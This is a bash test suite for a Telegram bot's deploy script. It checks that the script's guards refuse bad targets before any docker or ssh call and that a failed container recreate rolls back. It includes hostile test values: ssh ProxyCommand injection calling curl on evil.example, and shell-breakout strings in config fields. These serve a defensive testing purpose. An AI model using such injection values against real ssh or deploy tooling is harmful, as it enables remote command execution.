#!/usr/bin/env bash
# Wire-level tests for tools/deploy/deploy.sh (TGB-112).
#
# The guard and the preflight are unit-tested on their own
# (tools/ci/deploy-target-guard.test.sh, tools/deploy/remote-preflight.test.sh). This
# suite proves the *wiring*, which those cannot: that deploy.sh reaches the guards
# before it makes a single docker or ssh call, that a refused target never touches the
# host, and that a legitimate target still gets through (otherwise the negative cases
# would be passing for the wrong reason).
#
# `docker`, `sha256sum` and `ssh` are stubs on PATH; the repo is a copy inside a temp
# dir, so nothing here can build, push or reach a host.
#
# Run: bash tools/deploy/deploy-guards.test.sh
# bash 3.2 (macOS) compatible.
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"

WORK="$(mktemp -d "${TMPDIR:-/tmp}/memes-deploy-guards-test.XXXXXX")"
trap 'rm -rf "$WORK"' EXIT

PASS=0
FAIL=0
pass() { echo "PASS: $1"; PASS=$((PASS + 1)); }
fail() { echo "FAIL: $1 — $2"; FAIL=$((FAIL + 1)); }

# --- a throwaway repo with stubs on PATH --------------------------------------
ROOT="$WORK/repo"
mkdir -p "$ROOT"
cp -R "$REPO_ROOT/tools" "$ROOT/tools"
cp "$REPO_ROOT/package-lock.json" "$ROOT/package-lock.json"

BIN="$WORK/bin"
SECRETS="$WORK/secrets"
mkdir -p "$BIN" "$SECRETS"

cat > "$BIN/docker" <<'SH'
#!/usr/bin/env bash
echo "docker $1" >> "$STUB_LOG"
case "${1:-}" in
  manifest) exit 1 ;;                       # always take the build branch
  build) echo "stub build" ;;
  pull) echo "stub pull" ;;
  inspect) printf '%s\n' "${STUB_PREV_REF:-}" ;;   # what is running before the deploy
esac
exit 0
SH
cat > "$BIN/ssh" <<'SH'
#!/usr/bin/env bash
# Stub ssh: find the user@host argument, then look at the remote command exactly as the
# real ssh client would send it (argv joined with spaces). Syntax-checks whatever
# deploy.sh generated, answers the running-image read, and can fail a recreate on demand.
echo "ssh" >> "$STUB_LOG"
idx=0
target=0
for a in "$@"; do
  idx=$((idx + 1))
  case "$a" in
    *@*) target="$idx"; break ;;
  esac
done
[ "$target" -gt 0 ] || exit "${STUB_SSH_RC:-1}"
shift "$target"
cmdline="$*"

# The running-image read (`docker inspect ... {{.Config.Image}} ...`) answers with the
# reference configured for this case — that is how PREV_REF gets a value.
case "$cmdline" in
  *"Config.Image"*)
    printf '%s\n' "${STUB_PREV_REF:-}"
    exit 0
    ;;
esac

case "$cmdline" in
  "bash -s"*)
    body="$(cat)"
    if printf '%s\n' "$body" | bash -n 2>>"$STUB_LOG"; then
      echo "ssh-stdin-ok" >> "$STUB_LOG"
    else
      echo "ssh-stdin-invalid" >> "$STUB_LOG"
    fi
    # Which gate phase ran, and which image each recreate asked for. The phase comes
    # from the argv, not from the body: the preflight script mentions both flags itself.
    case "$cmdline" in
      *"--phase pre"*) echo "preflight phase=pre" >> "$STUB_LOG" ;;
      *"--phase post"*) echo "preflight phase=post" >> "$STUB_LOG" ;;
    esac
    case "$body" in
      *"up -d --no-deps"*)
        ref="$(printf '%s\n' "$body" | sed -n "s/.*MEMES_BOT_IMAGE='\([^']*\)'.*/\1/p" | head -1)"
        echo "compose-up image=${ref:-none}" >> "$STUB_LOG"
        if [ "${STUB_FAIL_UP:-0}" = 1 ] && [ -n "${STUB_FAIL_ONCE_FILE:-}" ] && [ ! -f "$STUB_FAIL_ONCE_FILE" ]; then
          : > "$STUB_FAIL_ONCE_FILE"
          echo "compose-up-failed" >> "$STUB_LOG"
          exit 1
        fi
        ;;
    esac
    ;;
  *)
    if [ -n "$cmdline" ] && printf '%s\n' "$cmdline" | bash -n 2>>"$STUB_LOG"; then
      echo "ssh-command-ok" >> "$STUB_LOG"
    fi
    ;;
esac
exit "${STUB_SSH_RC:-1}"
SH
cat > "$BIN/sha256sum" <<'SH'
#!/usr/bin/env bash
printf '%s\n' '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'
SH
chmod +x "$BIN/docker" "$BIN/ssh" "$BIN/sha256sum"

TARGET="$SECRETS/target.env"
write_target() { # write_target <host> [extra lines...]
  local host="$1"
  shift
  {
    printf 'DEPLOY_HOST=%s\n' "$host"
    printf 'DEPLOY_USER=root\n'
    printf 'DEPLOY_IMAGE=cr.yandex/crp8g8jm3p8d780a8hk3/telegram-bot\n'
    printf 'DEPLOY_SERVICE=telegram-bot\n'
    printf 'DEPLOY_CONTAINER=telegram-bot\n'
    printf 'DEPLOY_PROJECT=memes-bot\n'
    printf 'DEPLOY_STACK_DIR=/opt/memes-bot\n'
    printf 'DEPLOY_COMPOSE_FILE=/opt/memes-bot/docker-compose.yml\n'
    printf 'DEPLOY_ENV_FILE=/opt/memes-bot/bot.env\n'
    printf 'DEPLOY_INFRA_ENV_FILE=/opt/memes-bot/infra.env\n'
    printf 'DEPLOY_SSH_KEY=/deploy-secrets/id_ed25519\n'
    for extra in "$@"; do printf '%s\n' "$extra"; done
  } > "$TARGET"
  chmod 600 "$TARGET"
}

# run_deploy <outfile> — deploy.sh inside the copy, stubs on PATH, clean environment.
# Each run starts from a clean stub log and a re-armed "fail the first up" trigger.
run_deploy() {
  local out="$1"
  STUB_LOG="$WORK/stub.log"
  : > "$STUB_LOG"
  rm -f "$WORK/fail-once"
  ( cd "$ROOT" && env -i PATH="$BIN:$PATH" HOME="$HOME" TMPDIR="${TMPDIR:-/tmp}" \
      STUB_LOG="$STUB_LOG" DEPLOY_SECRETS_DIR="$SECRETS" STUB_SSH_RC="${STUB_SSH_RC:-}" \
      STUB_PREV_REF="${STUB_PREV_REF:-}" STUB_FAIL_UP="${STUB_FAIL_UP:-0}" \
      STUB_FAIL_ONCE_FILE="${STUB_FAIL_ONCE_FILE:-$WORK/fail-once}" \
      bash tools/deploy/deploy.sh 0.0.0-test deadbeef ) >"$out" 2>&1
}

stub_log() { [ -f "$WORK/stub.log" ] && cat "$WORK/stub.log" || true; }

# expects_refusal <label> <outfile>
expects_refusal() {
  local label="$1" out="$2"
  if run_deploy "$out"; then
    fail "$label" "expected non-zero exit, got 0 — a refused target was deployed"
  else
    pass "$label → refused"
  fi
  if [ -z "$(stub_log)" ]; then
    pass "$label → no docker and no ssh call before the refusal"
  else
    fail "$label (no host contact)" "stub calls: $(tr '\n' '|' < "$WORK/stub.log")"
  fi
}

# --- 1. the retired host (the point of the guard) ------------------------------
write_target 38.180.69.206
expects_refusal "retired host (38.180.69.206)" "$WORK/out.retired"
if grep -q 'deny-list' "$WORK/out.retired"; then
  pass "retired host → refusal names the deny-list"
else
  fail "retired host message" "$(tr '\n' '|' < "$WORK/out.retired")"
fi

# --- 2. an ambiguous / empty target -------------------------------------------
write_target ''
expects_refusal "empty DEPLOY_HOST" "$WORK/out.empty"

{ printf 'DEPLOY_HOST=185.238.169.171\n'; printf 'DEPLOY_HOST=38.180.69.206\n'; } > "$TARGET"
chmod 600 "$TARGET"
expects_refusal "two DEPLOY_HOST assignments" "$WORK/out.dup"

# --- 3. an ssh-injection target ------------------------------------------------
write_target '-oProxyCommand=curl evil.example'
expects_refusal "leading dash in DEPLOY_HOST" "$WORK/out.dash"

# --- 4. missing configuration must fail before any host call -------------------
{ printf 'DEPLOY_HOST=185.238.169.171\nDEPLOY_USER=root\n'; } > "$TARGET"
chmod 600 "$TARGET"
expects_refusal "target file without the required keys" "$WORK/out.incomplete"

# --- 5. a relative remote path must not reach the host shell -------------------
write_target 185.238.169.171 'DEPLOY_STACK_DIR=opt/memes-bot'
expects_refusal "relative DEPLOY_STACK_DIR" "$WORK/out.relpath"
if grep -q 'absolute path' "$WORK/out.relpath"; then
  pass "relative path → refusal is explicit"
else
  fail "relative path message" "$(tr '\n' '|' < "$WORK/out.relpath")"
fi

# --- 6. a nonsense log window --------------------------------------------------
write_target 185.238.169.171 'DEPLOY_LOG_WINDOW=whenever'
expects_refusal "DEPLOY_LOG_WINDOW that is not a duration" "$WORK/out.window"

# --- 7. sanity: a legitimate target is not refused -----------------------------
write_target 185.238.169.171
run_deploy "$WORK/out.valid" || true
if grep -q 'docker push' <<<"$(stub_log)"; then
  pass "valid target → reaches the image push (guards do not refuse a good target)"
else
  fail "valid target" "stub calls: $(tr '\n' '|' < "$WORK/stub.log")"
fi
if grep -q '^ssh$' <<<"$(stub_log)"; then
  pass "valid target → reaches the transport step (stub ssh, no real host)"
else
  fail "valid target transport" "the deploy never got as far as ssh"
fi
if grep -qE 'deny-list|absolute path|ssh option' "$WORK/out.valid"; then
  fail "valid target guards" "a guard fired on a legitimate target"
else
  pass "valid target → no guard fired"
fi

# --- 8. every remote script this deploy generates must be valid bash -----------
# The ssh stub syntax-checks what deploy.sh sends (`bash -s` bodies and single-string
# commands) and logs the verdict, so a broken heredoc cannot reach a host unnoticed.
STUB_SSH_RC=0 run_deploy "$WORK/out.remote" || true
if grep -q 'ssh-stdin-invalid\|ssh-command-invalid' "$WORK/stub.log"; then
  fail "generated remote scripts" "syntax error in a remote script: $(tr '\n' '|' < "$WORK/stub.log")"
else
  pass "generated remote scripts are syntactically valid bash"
fi
if grep -q 'ssh-stdin-ok' "$WORK/stub.log" && grep -q 'ssh-command-ok' "$WORK/stub.log"; then
  pass "both remote-script shapes were actually exercised (stdin body + command string)"
else
  fail "remote-script coverage" "stub calls: $(tr '\n' '|' < "$WORK/stub.log")"
fi

# --- 9. M1: a failed `docker compose up` must still roll back and re-gate --------
# Review M1: the recreate used to be a bare command, so `set -e` aborted the script with
# the old container stopped, the new one never started and NO rollback — the exact
# moment the rollback matters. The ssh stub fails the first `up` and succeeds after.
write_target 185.238.169.171
STUB_PREV_REF='cr.yandex/crp8g8jm3p8d780a8hk3/telegram-bot:0.41.3' STUB_SSH_RC=0 STUB_FAIL_UP=1 \
  run_deploy "$WORK/out.upfailed" || true
LOG="$(stub_log)"
if grep -q 'compose-up-failed' <<<"$LOG"; then
  pass "the stub actually failed the first recreate (the path under test was taken)"
else
  fail "M1 setup" "the stub never failed an up: $(tr '\n' '|' <<<"$LOG")"
fi
if grep -q 'compose-up image=cr.yandex/crp8g8jm3p8d780a8hk3/telegram-bot:0.41.3' <<<"$LOG"; then
  pass "a failed recreate still rolls back to the recorded previous image (0.41.3)"
else
  fail "M1 rollback" "no rollback recreate in: $(tr '\n' '|' <<<"$LOG")"
fi
if [ "$(grep -c 'compose-up image=' <<<"$LOG")" -eq 2 ]; then
  pass "exactly two recreates: the requested one and the rollback"
else
  fail "M1 recreate count" "$(grep -c 'compose-up image=' <<<"$LOG") recreate(s)"
fi
if [ "$(grep -c 'preflight phase=post' <<<"$LOG")" -eq 1 ]; then
  # The failed-recreate path never runs the normal post gate, so the single postflight
  # here can only be the rollback's re-gate.
  pass "the rollback re-runs the same gate (postflight) instead of trusting the recreate"
else
  fail "M1 re-gate" "expected exactly 1 postflight (the rollback's), got $(grep -c 'preflight phase=post' <<<"$LOG")"
fi
if grep -qE 'rolling telegram-bot back|the recreate failed' "$WORK/out.upfailed"; then
  pass "the failure is reported loudly on stdout/stderr"
else
  fail "M1 reporting" "$(tr '\n' '|' < "$WORK/out.upfailed")"
fi

# --- 10. m1: values that reach a remote shell are allow-listed ------------------
# The review's three proofs, each refused locally with no docker and no ssh call.
INJECT_MARKER="$WORK/pwned-by-service"
rm -f "$INJECT_MARKER"
write_target 185.238.169.171 "DEPLOY_SERVICE=telegram-bot'; touch $INJECT_MARKER; :'"
expects_refusal "quoted DEPLOY_SERVICE (remote shell breakout)" "$WORK/out.injservice"
[ -e "$INJECT_MARKER" ] && fail "injection" "the payload executed" || pass "no payload executed for DEPLOY_SERVICE"

write_target 185.238.169.171 "DEPLOY_LOG_WINDOW='10m;id'"
expects_refusal "DEPLOY_LOG_WINDOW carrying a command" "$WORK/out.injwindow"

write_target 185.238.169.171 'DEPLOY_USER=-oProxyCommand=curl evil.example'
expects_refusal "DEPLOY_USER with a leading dash" "$WORK/out.injuser"

write_target 185.238.169.171 'DEPLOY_LOG_WINDOW=1e5m'
expects_refusal "DEPLOY_LOG_WINDOW that only looks like a duration" "$WORK/out.injwindow2"

echo
echo "Result: PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ] || exit 1
exit 0
